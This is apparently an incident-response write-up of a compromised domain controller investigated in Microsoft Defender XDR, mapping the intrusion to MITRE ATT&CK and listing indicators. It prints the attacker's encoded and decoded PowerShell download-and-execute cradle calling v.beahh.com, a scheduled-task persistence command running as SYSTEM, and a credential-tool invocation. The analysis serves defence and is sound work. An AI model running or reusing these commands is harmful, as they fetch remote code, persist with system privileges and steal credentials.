
# Fileless PowerShell Persistence Investigation – Microsoft Defender XDR

## Overview

This investigation analyzes a high-severity Microsoft Defender XDR alert involving repeated encoded PowerShell execution on a Domain Controller. What initially appeared as a suspicious PowerShell command evolved into a broader compromise involving scheduled task persistence, SYSTEM-level execution, outbound communication, dropped payloads, and post-compromise activity.

The objective of this case was to validate the alert, reconstruct the attacker’s behavior, determine the persistence mechanism, identify indicators of compromise, and assess potential business impact.

---

## Environment

- **Platform:** Microsoft Defender XDR  
- **Target Host:** `mts-dc.mts.local`  
- **Asset Role:** Domain Controller  
- **Operating System:** Windows Server  
- **Investigation Window:** Apr 16, 2026 – Apr 27, 2026

---

## Detection Summary

Microsoft Defender generated an alert for:

- **Suspicious PowerShell download or encoded command execution**

Initial review showed recurring executions of:

```"
powershell.EXE" -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AdgAuAGIAZQBhAGgAaAAuAGMAbwBtAC8AdgAnACsAJABlAG4AdgA6AFUAUwBFAFIARABPAE0AQQBJAE4AKQA=
```
The command was observed repeatedly across multiple days, strongly indicating automated execution rather than legitimate administrator activity.

## Investigation Process

### 1. Repeated Encoded PowerShell Activity

Advanced Hunting queries identified recurring PowerShell executions approximately every 50 minutes, tied to the Domain Controller and running under the SYSTEM account.

This strongly suggested an automated persistence mechanism operating with elevated privileges.

#### Key Findings

Executed as SYSTEM

Repeated on a fixed interval

Encoded command line

Same host across all executions

### 2. Payload Decoding

The Base64 payload was decoded in CyberChef and revealed:

```
IEX (New-Object Net.WebClient).DownloadString('http://v.beahh.com/v'+$env:USERDOMAIN)
```

#### Analysis
IEX executes code directly in memory
DownloadString() retrieves remote script content
$env:USERDOMAIN appends the Active Directory domain name to the request

This behavior is consistent with:

Fileless malware

Command-and-control staging

Remote tasking

In-memory payload delivery

No other devices are affected by this powershell command

### 3. Root Cause – Scheduled Task Persistence

Further investigation identified the malicious task creation command:

```
schtasks /create /ru system /sc MINUTE /mo 50 /tn "\Microsoft\windows\Bluetooths" /tr "powershell -ep bypass -e <payload>"
```

#### Why This Matters

Runs as SYSTEM

Executes every 50 minutes

Uses a deceptive Microsoft-style task name

Launches encoded PowerShell payload

Provides recurring privileged execution

This explains the repeated Defender detections over multiple days.

### 4. Outbound Communication

Network telemetry identified recurring successful connections associated with the malicious PowerShell process.

Observed Destination
v.beahh.com

Although the logged remote IP resolved as 127.0.0.1, this likely reflects local proxying, inspection, or telemetry redirection rather than the true external destination.

The stronger indicator is the repeated association between the encoded PowerShell process and the suspicious domain.

This behavior is consistent with:

Payload retrieval

Command-and-control check-ins

Remote tasking

Staged malware delivery

### 5. Dropped Payloads and File Artifacts

Hunting queries identified suspicious files written to disk during the compromise window.

Confirmed Files


| Timestamp    | Action   | File          | Path                                      |
| ------------ | -------- | ------------- | ----------------------------------------- |
| Apr 16 02:10 | Created  | `svchost.exe` | `C:\Windows\Temp\svchost.exe`             |
| Apr 16 02:30 | Modified | `svchost.exe` | `C:\Windows\Temp\svchost.exe`             |
| Apr 16 05:09 | Created  | `m.ps1`       | `C:\Windows\Temp\m.ps1`                   |
| Apr 16 05:09 | Renamed  | `svchost.exe` | `C:\Windows\SysWOW64\drivers\svchost.exe` |


Why This Matters
Legitimate svchost.exe should reside in System32
Execution from Temp directories strongly suggests masquerading
m.ps1 aligns with later credential-related PowerShell activity
Indicates transition from fileless execution to dropped tooling

### 6. Additional Suspicious Activity

Further PowerShell commands were identified during the same timeframe.

Credential-Related Activity:

```
powershell.exe -exec bypass "import-module c:\windows\temp\m.ps1;Invoke-Cats -pwds"
```

This likely indicates use of a custom toolkit for password discovery, credential access, or local enumeration.

Security Log Enumeration:

```
powershell -ep bypass -nop -c "(Get-EventLog -LogName 'Security' -After (get-date).AddDays(-7) -befor (get-date).AddDays(-3)).length"
```

This suggests attacker reconnaissance, log awareness, or attempts to understand available audit data.

### 7. Indicators of Compromise (IOCs)

| Type | Indicator |
|------|-----------|
| Domain | `v.beahh.com` |
| Domain | `oo.beahh.com` |
| IP Address | `95.189.49.66` |

#### Files:

| File Name   | SHA256                                                             | Path                                      | 
| ----------- | ------------------------------------------------------------------ | ----------------------------------------- |
| svchost.exe | `60b6d7664598e6a988d9389e6359838be966dfa54859d5cb1453cbc9b126ed7d` | `C:\Windows\Temp\svchost.exe`             |
| m.ps1       | `d943bc6dc7614894cc1c741c6c18ac2dbd2c5069f3ab9bc9def5cc2661e54dee` | `C:\Windows\Temp\m.ps1`                   |
| svchost.exe | `bdbfa96d17c2f06f68b3bcc84568cf445915e194f130b0dc2411805cf889b6cc` | `C:\Windows\SysWOW64\drivers\svchost.exe` |

#### Persistence Artifact

``
\Microsoft\windows\Bluetooths
``

## MITRE ATT&CK Mapping

| Tactic | Technique | ID | Evidence |
|-------|-----------|----|----------|
| Execution | PowerShell | T1059.001 | Encoded PowerShell command execution with `-ep bypass -e` |
| Persistence | Scheduled Task/Job: Scheduled Task | T1053.005 | Malicious task `\Microsoft\windows\Bluetooths` created to run every 50 minutes |
| Defense Evasion | Obfuscated/Compressed Files and Information | T1027 | Base64-encoded payload used to hide command intent |
| Defense Evasion | Masquerading | T1036 | Fake `svchost.exe` written outside legitimate Windows directories |
| Command and Control | Ingress Tool Transfer | T1105 | Remote script retrieved from `v.beahh.com` |
| Credential Access | OS Credential Dumping / Credential Discovery | T1003 / T1555 | `Invoke-Cats -pwds` execution suggests password-focused activity |
| Discovery | System Information Discovery | T1082 | Enumeration and host awareness activity observed |
| Discovery | Account Discovery | T1087 | Domain name appended in payload, likely environment-aware targeting |
| Discovery | Security Software Discovery / Log Discovery | T1518 / T1083 | Security log queries via `Get-EventLog -LogName Security` |
| Privilege Escalation / Persistence | Valid Accounts (SYSTEM Context Abuse) | T1078 | Payload executed repeatedly under SYSTEM account |

## Verdict

This investigation confirmed that the Defender alert was part of a broader compromise rather than an isolated PowerShell event.

An attacker established SYSTEM-level persistence through a malicious scheduled task, repeatedly executed remote in-memory payloads, dropped additional tools to disk, and performed follow-on activity consistent with credential access and reconnaissance.

The case highlights the importance of validating alerts beyond the initial detection and demonstrates how recurring PowerShell telemetry can reveal deeper persistence and attacker intent.
